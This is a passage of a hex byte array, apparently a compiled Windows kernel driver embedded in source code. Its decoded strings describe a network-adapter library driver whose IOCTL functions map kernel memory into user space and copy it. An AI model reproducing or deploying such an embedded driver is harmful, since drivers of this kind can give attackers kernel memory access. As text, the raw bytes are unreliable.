		0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x3A, 0x20, 0x4C, 0x65, 0x61, 0x76, 0x69, 0x6E, 0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x3A, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x3A, 0x20, 0x4C, 0x65, 0x61, 0x76, 0x69, 0x6E, 0x67,
		0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x3A,
		0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C,
		0x3A, 0x20, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64,
		0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x20, 0x63,
		0x6F, 0x64, 0x65, 0x20, 0x30, 0x78, 0x25, 0x30, 0x78, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x41, 0x4C, 0x5F, 0x45, 0x4E, 0x41, 0x42, 0x4C, 0x45, 0x5F, 0x44, 0x45, 0x42, 0x55, 0x47, 0x5F, 0x50, 0x52, 0x49, 0x4E, 0x54, 0x5F, 0x46,
		0x55, 0x4E, 0x43, 0x49, 0x44, 0x3A, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x41, 0x4C, 0x5F, 0x4B, 0x4B, 0x4D, 0x45, 0x4D, 0x43, 0x50, 0x59, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x3A, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x20,
		0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x41, 0x4C, 0x5F, 0x4B, 0x55, 0x4D, 0x45, 0x4D, 0x43, 0x50, 0x59, 0x5F, 0x46, 0x55, 0x4E,
		0x43, 0x49, 0x44, 0x3A, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x41, 0x4C, 0x5F, 0x4B, 0x4D, 0x45, 0x4D, 0x53, 0x45, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x3A, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20, 0x62,
		0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x3A, 0x20,
		0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x55, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x74, 0x6F,
		0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x4D, 0x44, 0x4C, 0x0A, 0x00, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x41,
		0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x54, 0x6F, 0x20, 0x46, 0x72, 0x65, 0x65, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64,
		0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x46, 0x72, 0x65, 0x65, 0x69, 0x6E, 0x67, 0x20,
		0x4D, 0x44, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x4C, 0x65, 0x76,
		0x65, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x53, 0x49, 0x5A,
		0x45, 0x20, 0x2A, 0x20, 0x28, 0x36, 0x35, 0x35, 0x33, 0x35, 0x20, 0x2D, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x6F, 0x66, 0x28, 0x4D, 0x44, 0x4C, 0x29, 0x29, 0x20, 0x2F, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x6F, 0x66, 0x28, 0x55, 0x4C, 0x4F, 0x4E, 0x47,
		0x5F, 0x50, 0x54, 0x52, 0x29, 0x20, 0x3D, 0x20, 0x25, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x55,
		0x73, 0x69, 0x6E, 0x67, 0x20, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x6D, 0x61, 0x70, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x73, 0x6C, 0x6F, 0x74, 0x20, 0x25, 0x64, 0x20, 0x2D, 0x20, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x20, 0x25,
		0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x70, 0x69,
		0x6E, 0x67, 0x20, 0x6E, 0x6F, 0x6E, 0x2D, 0x75, 0x73, 0x65, 0x72, 0x6D, 0x6F, 0x64, 0x65, 0x20, 0x6D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x4C, 0x65, 0x6E,
		0x67, 0x74, 0x68, 0x20, 0x25, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x41, 0x64, 0x64, 0x72, 0x65,
		0x73, 0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x2D, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x75, 0x6E, 0x6D, 0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x30, 0x78,
		0x25, 0x70, 0x2C, 0x20, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x20, 0x25, 0x64, 0x0A, 0x00, 0xCC, 0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x47, 0x6C, 0x6F, 0x62, 0x61,
		0x6C, 0x5F, 0x57, 0x69, 0x6E, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4D, 0x61, 0x70, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x5B, 0x69, 0x5D, 0x2E, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x20, 0x3D, 0x20, 0x25,
		0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x55, 0x6E, 0x6D, 0x61, 0x70,
		0x70, 0x69, 0x6E, 0x67, 0x20, 0x4F, 0x72, 0x69, 0x67, 0x69, 0x6E, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x53, 0x6B, 0x69, 0x70, 0x70, 0x65, 0x64, 0x20, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64,
		0x50, 0x61, 0x67, 0x65, 0x73, 0x20, 0x2D, 0x20, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x20, 0x6F, 0x72, 0x20, 0x4D, 0x64, 0x6C, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC,
		0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x43, 0x61, 0x6C, 0x6C, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64,
		0x50, 0x61, 0x67, 0x65, 0x73, 0x0A, 0x00, 0xCC, 0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x53, 0x6C, 0x6F, 0x74, 0x20, 0x25, 0x64, 0x20, 0x6D, 0x61, 0x74, 0x63, 0x68,
		0x65, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x47, 0x6C, 0x6F, 0x62, 0x61,
		0x6C, 0x5F, 0x57, 0x69, 0x6E, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4D, 0x61, 0x70, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x5B, 0x25, 0x64, 0x5D, 0x2E, 0x4D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20,
		0x30, 0x78, 0x25, 0x70, 0x20, 0x3D, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x4C, 0x6F, 0x6F, 0x6B, 0x69,
		0x6E, 0x67, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x6E, 0x6D, 0x61, 0x70, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x20, 0x25, 0x64, 0x2C, 0x20, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x20, 0x25,
		0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67,
		0x65, 0x64, 0x20, 0x2D, 0x20, 0x4D, 0x6D, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x0A, 0x00,
		0x5F, 0x4E, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x20, 0x2D, 0x20, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72,
		0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x65, 0x6D, 0x6F,
		0x72, 0x79, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x20, 0x2D, 0x20, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x46, 0x72,
		0x65, 0x65, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x44, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5F, 0x4E, 0x61, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4E, 0x6F,
		0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x45, 0x78, 0x3A, 0x20, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x65, 0x6E, 0x74, 0x65, 0x72,
		0x65, 0x64, 0x20, 0x69, 0x6E, 0x74, 0x6F, 0x20, 0x74, 0x68, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x2E, 0x20, 0x4E, 0x6F, 0x74, 0x20, 0x66, 0x72, 0x65, 0x65, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x6E, 0x79, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x2E,
		0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x4D, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x2A, 0x56, 0x69, 0x72, 0x74, 0x75,
		0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x28, 0x6D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x73, 0x65, 0x72, 0x29, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x61, 0x6C, 0x4D, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78, 0x3A, 0x20, 0x2A, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70,
		0x20, 0x28, 0x6E, 0x6F, 0x74, 0x20, 0x6D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x73, 0x65, 0x72, 0x29, 0x0A, 0x00, 0xCC, 0x4E, 0x61, 0x6C, 0x4D, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78,
		0x3A, 0x20, 0x56, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x54, 0x50, 0x4E, 0x50, 0x00, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x54, 0x72, 0x61, 0x6E, 0x73, 0x6C, 0x61, 0x74, 0x65, 0x64, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5C, 0x00, 0x52, 0x00, 0x45, 0x00, 0x47, 0x00, 0x49, 0x00, 0x53, 0x00, 0x54, 0x00, 0x52, 0x00,
		0x59, 0x00, 0x5C, 0x00, 0x4D, 0x00, 0x41, 0x00, 0x43, 0x00, 0x48, 0x00, 0x49, 0x00, 0x4E, 0x00, 0x45, 0x00, 0x5C, 0x00, 0x48, 0x00, 0x41, 0x00, 0x52, 0x00, 0x44, 0x00, 0x57, 0x00, 0x41, 0x00, 0x52, 0x00, 0x45, 0x00, 0x5C, 0x00, 0x52, 0x00,
		0x45, 0x00, 0x53, 0x00, 0x4F, 0x00, 0x55, 0x00, 0x52, 0x00, 0x43, 0x00, 0x45, 0x00, 0x4D, 0x00, 0x41, 0x00, 0x50, 0x00, 0x5C, 0x00, 0x50, 0x00, 0x6E, 0x00, 0x50, 0x00, 0x20, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x67, 0x00,
		0x65, 0x00, 0x72, 0x00, 0x5C, 0x00, 0x50, 0x00, 0x6E, 0x00, 0x70, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x6F, 0x6F, 0x6B, 0x69, 0x6E, 0x67, 0x20,
		0x66, 0x6F, 0x72, 0x20, 0x6D, 0x61, 0x74, 0x63, 0x68, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x25, 0x64, 0x2F, 0x25, 0x64, 0x2F, 0x25, 0x64, 0x0A, 0x00, 0x5F, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x61, 0x64, 0x50, 0x63, 0x69, 0x44, 0x65, 0x76, 0x69, 0x63,
		0x65, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x25, 0x64, 0x20, 0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x28, 0x25, 0x64, 0x29, 0x0A, 0x00, 0xCC, 0xCC, 0x63, 0x3A, 0x5C, 0x75, 0x73, 0x65, 0x72, 0x73,
		0x5C, 0x63, 0x6C, 0x6F, 0x75, 0x64, 0x62, 0x75, 0x69, 0x6C, 0x64, 0x5C, 0x33, 0x33, 0x37, 0x32, 0x34, 0x34, 0x5C, 0x73, 0x64, 0x6B, 0x5C, 0x6E, 0x61, 0x6C, 0x5C, 0x73, 0x72, 0x63, 0x5C, 0x77, 0x69, 0x6E, 0x6E, 0x74, 0x5F, 0x77, 0x64, 0x6D,
		0x5C, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x5C, 0x77, 0x69, 0x6E, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x70, 0x63, 0x69, 0x5F, 0x69, 0x2E, 0x63, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x46, 0x69, 0x6C, 0x6C, 0x4B, 0x65, 0x72, 0x6E,
		0x65, 0x6C, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x3A, 0x20, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x5F, 0x4E, 0x61, 0x6C, 0x48, 0x61, 0x73, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x72, 0x75, 0x70, 0x74, 0x4F, 0x63, 0x63, 0x75, 0x72, 0x72, 0x65, 0x64, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x25, 0x73, 0x0A, 0x00, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x46, 0x41, 0x4C, 0x53, 0x45, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x54, 0x52, 0x55, 0x45, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x46, 0x75, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x49, 0x64, 0x20, 0x3D, 0x20, 0x25,
		0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
		0x49, 0x4E, 0x5F, 0x49, 0x53, 0x5F, 0x41, 0x44, 0x41, 0x50, 0x54, 0x45, 0x52, 0x5F, 0x49, 0x4E, 0x5F, 0x55, 0x53, 0x45, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61,
		0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
		0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57, 0x49, 0x4E, 0x5F, 0x41, 0x44, 0x41, 0x50, 0x54, 0x45, 0x52, 0x5F, 0x49, 0x4E, 0x5F, 0x55, 0x53, 0x45, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44,
		0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
